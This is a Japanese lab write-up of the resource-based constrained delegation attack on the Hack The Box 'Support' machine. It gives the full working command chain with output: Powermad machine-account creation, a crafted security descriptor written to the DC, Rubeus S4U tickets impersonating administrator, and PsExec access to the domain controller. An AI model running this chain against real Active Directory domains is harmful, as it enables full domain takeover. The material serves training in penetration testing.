Shared Support Accountsというグループのメンバは、コンピュータdc.support.htbに対してGeneric All：

![alltodc](https://user-images.githubusercontent.com/85237728/194805252-d9fdfd2a-b0eb-41cf-956a-2cd91852b170.png)

```
*Evil-WinRM* PS C:\Users\support> Get-DomainController | select name

Name
----
dc.support.htb
```

このGeneric Allとはフルコントロールを意味する。

コンピュータオブジェクトをフルコントロールできる時、resource based constrained delegationアタックという攻撃手法がある。

（HTBのSupportを例にする）

[Powermad.ps1](https://github.com/Kevin-Robertson/Powermad)の`New-MachineAccount`で、新しくコンピュータアカウントを作成する：

```
*Evil-WinRM* PS C:\Users\support> . .\Powermad.ps1
*Evil-WinRM* PS C:\Users\support> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added
```
コンピュータアカウントが作成されたことを確認

```
*Evil-WinRM* PS C:\Users\support> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\support> Get-DomainComputer | select name

name
----
DC
MANAGEMENT
attackersystem
```

新規作成したコンピュータアカウントのSIDを取得する：

```
*Evil-WinRM* PS C:\Users\support> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
*Evil-WinRM* PS C:\Users\support> $ComputerSid
S-1-5-21-1677581083-3380853377-188903654-5101
```

この新規コンピュータアカウントのSIDを用いてACEの設定をする。
```
*Evil-WinRM* PS C:\Users\support> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
*Evil-WinRM* PS C:\Users\support> $SD


ControlFlags           : DiscretionaryAclPresent, SelfRelative
Owner                  : S-1-5-32-544
Group                  :
SystemAcl              :
DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}
ResourceManagerControl : 0
BinaryLength           : 80
```

そして、新たなDACL/ACEに対するバイナリを取得しておく：

```
*Evil-WinRM* PS C:\Users\support> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support> $SD.GetBinaryForm($SDBytes, 0)
```

[Security Descriptor, DACL, ACEについて](https://tech.blog.aerie.jp/entry/2017/12/19/104346)

作成したこのセキュリティ記述子（Security Descriptor）を、ターゲットであるコンピュータアカウントdcの「msDS-AllowedToActOnBehalfOfOtherIdentity」という属性に設定する：

```
dc.support.htb
*Evil-WinRM* PS C:\Users\support> Get-DomainComputer | select name

name
----
DC
MANAGEMENT
attackersystem

# 属性がセットされていないことを確認
*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | select name,msds-allowedtoactonbehalfofotheridentit

name msds-allowedtoactonbehalfofotheridentit
---- ---------------------------------------
DC

*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

最初に作成したコンピュータアカウントattackersystemのパスワードのRC4_HMAC形式を得るために[Rubeus.exe](https://github.com/GhostPack/Rubeus)を使う。

（Rubeus.exeのバイナリは[ここ](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)から）

```
*Evil-WinRM* PS C:\Users\support> .\Rubeus.exe hash /password:Summer2018!

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Calculate Password Hash(es)

[*] Input password             : Summer2018!
[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F
```

最後に、Rubeus.exeのs4uモジュールで、administratorのふりをしたいサービス名のサービス チケットを取得する。

ちなみにこの時の`klist`コマンドの出力は

```
*Evil-WinRM* PS C:\Users\support> klist

Current LogonId is 0:0x13358d

Cached Tickets: (0)
```

```
*Evil-WinRM* PS C:\Users\support> .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: S4U

[*] Using rc4_hmac hash: EF266C6B963C0BB683941032008AD47F
[*] Building AS-REQ (w/ preauth) for: 'support.htb\attackersystem$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      cnQuaHRi


[*] Action: S4U

[*] Building S4U2self request for: 'attackersystem$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'attackersystem$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      AaETMBEbD2F0dGFja2Vyc3lzdGVtJA==

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      doIGcDCCBmygAwIBBaEDAgEWooIFgjCCBX5hggV6MIIFdqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggU7MIIFN6ADAgESoQMCAQWiggUpBIIFJVPAiZ2d
      Sz4ft+j84ytiOepEDeI4mZgMvisW6CEtQSz0RbX/5uj25TbUYVBheaKsl1ua3NQEJ6DfYTSLrq307Tsk
      es+a2dRyviHy2QMaOcQHYReOaPTQYaOqWhTqj/DGcBxpqgFTqwgw+my6uvqq99SD04PWP4pqO370ialE
      ZihDQ+G6N1MzJtZl6eGHesy7BwFkrmqAT0FLVi/bUl5I8hE2cf3pzrkTVe1/P6K0kCd5G4UW9hL6DMpR
      dARscKctEzgEt9c2nd2Z8WyWzGygjah13vyoZ3xJSIFGlO2r0Lhio+DQSS8nbQ20Q0S4kRgZx7PeHqXJ
      cYLv4T5k97Ml2mLb56uDI0Hxtj6HhQogbxHlCohsjUPFHhh9ePTX3shUct7NlJ6cMufzvjRiuDIGQJTG
      PIRuB1Bigx7O+HuDGC/flKfDk0MEUFIi6JA68e8kMeZvrnzjgVAE9hdVcS2W3NNNo8E6RmcRW5MVIu7P
      Fvob2XGUn+8e0ZZ9fSlRgGnnuzgZcR7Q7JKuNEz4mzk6HgfaEktDSlnRHbP8pYbB3l/GI4tbvQoxJTMy
      otzuxYPMz2RmfIrD+yyq0L/pKHnoNybFIhxh7UwwanxDi6vsTXHT5uaRPLL79SdxifQqVGmK0C77FnOJ
      puDTRtNCIwJSCIkQx3JTIrO5Hpzz2Ay5r5LlfeWBud9BOcTp/R1JKd3gpi4Exs8Znr8W0v0msM4dmXRQ
      AOwWeNUiEagZ46ZFk45e0s2Q5vrErfSJbYsXsYgy67ymBHfkhUjMPP4LWi7tsm77G4vO35wt4ff6GHH2
      kV4DqLzYjoNHMEDKLVCmpb3BUBFnCZqmRFvEr/fBDBqlndoAc7WslSLa8C0wr8P7hhhDyZDs6d21yHqY
      gjCDHCLjVW72USmXl9xPNJQNOBkfUBcwHbYwpsxOjSjleteGRSXAOVUsgSDoiCzZrEcd3I29bzr7ZVaB
      0cDgHynSZ6DReUoER6M+lDVzCEDGdBknEiPKy3uSLHGMPsK/aakeR4PECeekkR4qtbzvvCj8xi+e9BCi
      79xvJHehyQgXhJs9+gZpgU0JVF1SepkrhXpPuB77cRb2/8K6BWYs3I6WK6T194RkVs53lTNkjbLojmy4
      Q0A+wWcRrxdmBb5NbkjH9yNAbrSPK8U1v20lXXXQDSx+JE2Un/cLvy2/doKMuwfi4vwH+/tleqQVGrVp
      6he/sIEr6dWtwiupf/PZY76sL5MDDncurjoh5ziKOBPJ7Q7GVprn4BnWsGtxaDrtnqzDl5MIwFIGLtuC
      iwCNoKYlJloYOlKU+DsYQwMOWgRytqAozxxPFJMnawoXlGEB4IzN1Q5Rze14qppuZ9/3iYnQZ0mz2AU2
      z9XV4ynstBpfCH1hn8vFeQ1OzLrA6X2eRt6K+P7dbZXxU1ACgjs65KbEnv2CEOFrL4f5gTTE/bqxsizn
      +JsZ1eX6hMA4dySFbsoSTkHJpVWCRPaoe1BSHyPbvPIH2HQIuNnWWdbPihPTlGkCtFU3QzZ1yARiNf1l
      bb7AhmXXC0PhvSs0lf6kq0xYsEyTK3vGac1TzAZUl1XbOYHu5GCVeQNaN0zmAz5KYuMl38CBgNhQpnHW
      0z8zwA/xkLAxl4fLLVFFjOchdvJsny1YU6IkgDzTSXQniGhnorhMdMgiYHK4bzPSPne9WaByhri8CP1s
      TIv9/deosAYQs/q6IueqL/S1ygC77WsVEbNCMmf7p/2RGAtvd+YUMfoiCI9+yVg6lVWMGKOB2TCB1qAD
      AgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oBswGaADAgERoRIEEK7xmCeuTx06/N/yrYAqxDuhDRsLU1VQ
      UE9SVC5IVEKiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjIxMDEwMDYz
      MTUzWqYRGA8yMDIyMTAxMDE2MzE1M1qnERgPMjAyMjEwMTcwNjMxNTNaqA0bC1NVUFBPUlQuSFRCqSEw
      H6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGI=
[+] Ticket successfully imported!
```

このタイミングで`klist`コマンドを実行すると
```
*Evil-WinRM* PS C:\Users\support> klist

Current LogonId is 0:0x13358d

Cached Tickets: (1)

#0>	Client: administrator @ SUPPORT.HTB
	Server: cifs/dc.support.htb @ SUPPORT.HTB
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
	Start Time: 10/9/2022 23:31:53 (local)
	End Time:   10/10/2022 9:31:53 (local)
	Renew Time: 10/16/2022 23:31:53 (local)
	Session Key Type: AES-128-CTS-HMAC-SHA1-96
	Cache Flags: 0
	Kdc Called:
```

これにより、dc.support.htbにアクセスできる。
```
*Evil-WinRM* PS C:\Users\support> ls \\dc.support.htb\C$
*Evil-WinRM* PS C:\Users\support> .\PsExec.exe -accepteula \\dc.support.htb cmd
```

うまく行かない場合は、[Suportのwalkthrough](https://github.com/MASAbirokou/HTB_ADbox_walkthrough/blob/main/Support.md)にあるようにKali上で実行する。



# 参考

- [解説動画あり]https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall
- [PENETRATION TESTING LAB](https://pentestlab.blog/2021/10/18/resource-based-constrained-delegation/)
- [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)


